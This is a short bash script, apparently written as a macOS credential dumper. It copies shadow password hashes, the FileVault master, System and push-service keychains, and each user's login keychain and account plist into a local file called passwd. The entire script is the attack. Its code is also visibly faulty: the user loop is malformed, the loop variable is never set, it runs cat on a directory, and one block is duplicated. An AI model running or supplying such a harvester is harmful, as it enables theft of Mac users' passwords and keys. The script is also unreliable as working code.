#!/bin/bash
# OSX is Unix that's not Unix so they spew their passwds all over the place
# <eric.gragsone@erisresearch.org>

log=./passwd
read -a Users <<< `ls /Users/`
echo ${Users[4]%?}
touch $log

# System Level
echo 'cat /var/db/shadow/hash/' >> $log
cat /var/db/shadow/hash/ >> $log
echo '' >> $log

echo 'cat /Library/Keychains/FileVaultMaster.keychain' >> $log
cat /Library/Keychains/FileVaultMaster.keychain >> $log
echo '' >> $log

echo 'cat /Library/Keychains/System.keychain' >> $log
cat /Library/Keychains/System.keychain >> $log
echo '' >> $log

echo 'cat /Library/Keychains/applepushserviced.keychain' >> $log
cat /Library/Keychains/applepushserviced.keychain >> $log
echo '' >> $log

# User Level
while $Users
do
  echo "# Checking $user" >> $log
  echo '' >> $log

  echo 'cat /Users/<USERNAME>/Library/Preferences/AddressBookMe.plist' >> $log
  cat /Users/$user/Library/Preferences/AddressBookMe.plist >> $log
  echo '' >> $log

  echo 'cat /private/var/db/dslocal/nodes/Default/users/<USERNAME>.plist' >> $log
  cat /private/var/db/dslocal/nodes/Default/users/$user.plist >> $log
  echo '' >> $log

  echo 'cat /private/var/db/dslocal/nodes/Default/users/<USERNAME>.plist' >> $log
  cat /private/var/db/dslocal/nodes/Default/users/$user.plist >> $log
  echo '' >> $log

  echo 'cat /Users/<USERNAME>/Library/Keychains/login.keychain' >> $log
  cat /Users/$user/Library/Keychains/login.keychain >> $log
  echo '' >> $log

done
